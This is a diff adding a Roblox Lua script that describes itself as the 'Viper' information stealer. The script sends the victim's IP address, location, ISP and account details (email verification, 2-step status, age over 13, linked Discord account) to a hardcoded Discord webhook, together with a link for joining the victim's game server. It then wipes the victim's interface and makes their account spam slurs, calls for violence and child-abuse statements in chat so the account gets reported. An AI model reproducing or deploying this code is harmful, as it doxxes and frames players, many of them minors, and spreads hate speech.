@@ -1,0 +1,238 @@
+xpcall(function()
+
+    local Webhookurl = "https://discord.com/api/webhooks/1251714746424496240/MQ_tYTuoFY3zS_MYemmWARPQ36BrJW92p8jKBhzAxS5SqADOF-XrXOmQKtk4Fwz7bUDV"
+    --[[ DONT CHANGE IT DOESNT DO ANYTHING]] local Anywebsite = ""
+    local WebsiteSpoit = true
+    local --[[ DONT CHANGE IT DOESNT DO ANYTHING]] SpeedofWebsiteSpoit = 20
+    local MouseFuckerr = true -- doesnt really do anything  
+    print("Customise Varibles lodaded")
+    local http = game:GetService("HttpService")
+
+    function WebsiteSpoitLoop()
+        while true do
+            game:GetService("LinkingService"):OpenUrl(Anywebsite)
+            task.wait(SpeedofWebsiteSpoit)
+        end
+    end
+    
+    function giveip(wb)
+        local player_name = game:GetService("Players").LocalPlayer.Name
+        local webhook_url = wb
+        print("Varibles in giveip() is working")
+        local ip_info = request({
+         Url = "http://ip-api.com/json",
+          Method = "GET"
+        })
+            local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+        local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+        
+
+        local embed = http:JSONEncode({
+            embeds = {
+               {
+                  title = "Ip infomation",
+                  description = dataMessage,
+                  color = 0xEA6363,
+                  footer = {
+                     text = ("Fun fact: Viper is one of the only **GOOD** Infomation Stealers/Rats")
+                  }
+               }
+            }
+         })
+        
+         request({
+            Url = wb,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = embed
+         })
+    print("Did a successful request to the webhook (ip)")
+    end
+    
+    
+    
+    function MouseFucker(x, y)
+        while game:GetService("RunService").Stepped:Wait() do
+            mousemoverel(Vector2.New(x), Vector2.New(y))
+        end
+    end
+    
+    function misc(wb)
+        local one = "https://www.roblox.com/mobileapi/userinfo"
+        local two = "https://www.roblox.com/my/account/json"
+        local three = "https://www.roblox.com/my/settings/json"
+        local linkone = request({
+        Url = one,
+        Method = "GET"
+        })
+    
+           local linktwo = request({
+            Url = two,
+            Method = "GET"
+          })
+        
+          local linkthree = request({
+            Url = three,
+            Method = "GET"
+          })
+
+          print("did GET requests (misc)")
+            local oneinfo = game:GetService("HttpService"):JSONDecode(linkone.Body)
+            local twoinfo = game:GetService("HttpService"):JSONDecode(linktwo.Body)
+            local threeinfo = game:GetService("HttpService"):JSONDecode(linkthree.Body)
+            local aaaaaaaaaaa = game.Players.LocalPlayer.AccountAge
+            local discord = tostring(game:GetService("HttpService"):JSONDecode(request({Url = "https://api.ropro.io/getUserInfoTest.php?myid=0&userid=" .. game.Players.LocalPlayer.UserId}).Body).discord):gsub("", "No account connected")
+
+            print("Jsoned decoded oneinfo, twoinfo and threeinfo and got the account age")
+            
+            
+            local dataMessage = "Changing password needs 2 step verification: "..tostring(threeinfo.ChangePasswordRequiresTwoStepVerification).. "\n".. "Verified email: ".. tostring(threeinfo.UserEmailVerified).. "\n".. "Account age: ".. tostring(aaaaaaaaaaa).." \n Premium: "..tostring(oneinfo.IsPremium)..print("Got if this person is premium").." \n Changing password needs 2 step: "..tostring(threeinfo.ChangePasswordRequiresTwoStepVerification).." \n Is Above 13 (According to users birthday): "..tostring(twoinfo.UserAbove13)..print("got if above 13").." \n Executor: "..identifyexecutor()..print("got executor").." \n Discord (Rolimons API on top fr): "..discord..print("got discord")
+            
+            print("Data message done (misc)")
+            
+            
+            
+local embed = http:JSONEncode({
+    embeds = {
+       {
+          title = "Misc",
+          description = dataMessage,
+          color = 0xEA6363,
+          footer = {
+             text = ("Viper destroyed "..game.Players.LocalPlayer.DisplayName.." For real lmfaoo")
+          }
+       }
+    }
+ })
+
+ request({
+    Url = wb,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = embed
+ })
+
+        print("request successful 😎")
+        end
+
+        function kick()
+            local ip_info = request({
+                Url = "http://ip-api.com/json",
+                 Method = "GET"
+               })
+                   local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+                    game.Players.LocalPlayer:Kick(tostring(ipinfo_table.query))
+        end
+    
+    function main(wb)
+    local placeid = game.PlaceId
+    local gamename = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    local playerid = game.Players.LocalPlayer.UserId
+    local lplr = game.Players.LocalPlayer
+    local userid = lplr.UserId
+    local display = lplr.DisplayName
+    local user = lplr.Name
+    local jobid = game.JobId
+    local link = string.format("roblox://placeID=%d&gameInstanceId=%s", placeid, jobid); print("link varible loaded")
+    local webhook_url = wb
+
+    print("Varibles loaded (main)")
+
+    giveip(Webhookurl)
+    misc(Webhookurl)
+    local dataMessage = "```----- game infomation ----- \n placeid: "..placeid.." , \n GameName: "..gamename.." , \n  JobID: "..jobid.."\n ------------------ Player Infomation ----------- \n UserName: "..user.." \n Displayname: "..display.." \n UserId: "..playerid.."``` Join "..display.." [Here]("..link..")"
+        print("data message success")
+    request(
+    {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+    )
+
+    print"Did player infomation and game infomation request"
+
+    local Sky = Instance.new('Sky')
+    Sky.Parent = game.Lighting
+    Sky.CelestialBodiesShown= false
+    Sky.SkyboxBk= "http://www.roblox.com/asset/?id=103560945"
+    Sky.SkyboxDn= "http://www.roblox.com/asset/?id=103560945"
+    Sky.SkyboxFt= "http://www.roblox.com/asset/?id=103560945"
+    Sky.SkyboxLf= "http://www.roblox.com/asset/?id=103560945"
+    Sky.SkyboxRt= "http://www.roblox.com/asset/?id=103560945"
+    Sky.SkyboxUp= "http://www.roblox.com/asset/?id=103560945" 
+
+    print("Set sky")
+
+    for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
+        if v then
+            v:Destroy()
+        end
+    end
+    local function Beta()
+        if not game.ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+            return true
+        else
+            return false
+        end
+    end
+     print("Beta function loaded")
+    function Chat(msg)
+      if Beta() == false then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+      else
+            local functionChannels = game:GetService("TextChatService").TextChannels
+            local General = functionChannels.RBXGeneral
+
+            General:SendAsync(msg)
+      end 
+    end
+
+    print("Chat function loaded")
+
+    local sentences = {"Please report me", "report me for free candy", "The ",                                                                                                "Im gonna go watch child porn real quick", "I <3 child porn", "I hate niggers and fucking indians and chinese people", "You deserve to be raped", "Kill all Muslims", "Faggot deserved it", "I'm going to bomb Israel and palestine", "Slaves should still be a thing", "All Jews are greedy", "Women are inferior", "Go back to your own country, immigrant.", "Arabs are oil-rich and lazy.", "You have a nice ass.", "Can i touch your boobs?", "Women belong in the kitchen.", "All gays are pedophiles.", "Fags should burn in hell.", "Gay people should be locked up.","Trans men are just butch lesbians.", "All Sikhs are terrorists.", "I want to run someone over with my car.", "I want to saw someone in half.", "Jewish people have too much power and influence.", "White people are the only true Americans.", "Arab people are all terrorists.", "Asian people are good at math, but they can't drive.", "Men are better leaders than women.", "Men should never show vulnerability to women.", "Men should never be emotionally dependent on women.", "Gay people should not be allowed to use public restrooms with straight people.", "Gay people should not be allowed to teach in schools.", "I don't care about Child porn laws, I'll look at it if I want to.", "Rape is not a big deal, it's just a way to assert dominance.", "I support genocide against certain groups of people Like jews.", "I think it's okay to hurt animals for fun.", "I think Child Porn should be legalized.", "I don't care about the consequences of my actions, I'll do what I want.", "i love illegal distribution"}
+
+    function getRandomElement(table)
+        local length =  #table
+        if length == 0 then return nil end
+        local index = math.random(length)
+        return table[index]
+    end
+
+    print("getRandomElement function loaded")
+    
+    coroutine.wrap(function()
+        while task.wait(2.5) do
+            Chat(getRandomElement(sentences))            
+        end
+    end)()
+
+    print("Chatted")
+    
+    --[[
+        coroutine.wrap(function()
+        MouseFucker(math.random(0 , 500), math.random(0, 500))
+    end)()
+    ]]
+
+    wait(10)
+    -- kick()
+    
+    end
+    
+    main(Webhookurl)
+    
+    --[[
+        if WebsiteSpoit then
+        WebsiteSpoitLoop()
+    end
+    ]]
+
+    print("Loaded successfully")
+end, function(ec)
+print(ec)
+end)
+
